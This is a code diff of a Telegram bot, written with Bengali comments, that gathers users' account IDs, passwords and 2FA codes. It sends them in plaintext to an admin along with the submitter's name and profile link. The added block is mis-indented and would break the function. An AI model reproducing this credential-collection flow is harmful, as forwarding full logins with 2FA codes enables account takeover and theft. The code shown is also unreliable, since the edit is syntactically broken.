@@ -147,14 +147,17 @@ async def get_pass(message: types.Message, state: FSMContext):
 @dp.message_handler(state=BotState.waiting_for_single_2fa)
 async def get_2fa(message: types.Message, state: FSMContext):
     data = await state.get_data()
-    # এডমিন প্যানেলে বিস্তারিত রিপোর্ট পাঠানো
-    admin_msg = (f"🚀 **নতুন সিঙ্গেল আইডি জমা পড়েছে!**\n\n"
-                 f"👤 **ইউজার আইডি:** `{message.from_user.id}`\n"
-                 f"📂 **ক্যাটাগরি:** {data.get('category')}\n"
-                 f"━━━━━━━━━━━━━━━\n"
-                 f"🆔 **ID:** `{data.get('u_id')}`\n"
-                 f"🔑 **Pass:** `{data.get('u_pass')}`\n"
-                 f"🔐 **2FA:** `{message.text}`")
+    # ১৪৯ থেকে ১৫৫ নম্বর লাইনের সিঙ্গেল আইডি রিপোর্ট অংশে এটি বসান
+admin_msg = (f"🚀 **নতুন সিঙ্গেল আইডি জমা পড়েছে!**\n\n"
+             f"👤 **ইউজার:** {message.from_user.full_name}\n"
+             f"🆔 **আইডি:** `{message.from_user.id}`\n"
+             f"🔗 **প্রোফাইল:** [এখানে ক্লিক করুন](tg://user?id={message.from_user.id})\n"
+             f"📂 **ক্যাটাগরি:** {data.get('category')}\n"
+             f"━━━━━━━━━━━━━━━\n"
+             f"🆔 **ID:** `{data.get('u_id')}`\n"
+             f"🔑 **Pass:** `{data.get('u_pass')}`\n"
+             f"🔐 **2FA:** `{message.text}`")
+
     import datetime
     today = datetime.date.today().strftime("%Y-%m-%d")
     cursor.execute("INSERT OR IGNORE INTO stats (user_id, date) VALUES (?, ?)", (message.from_user.id, today))
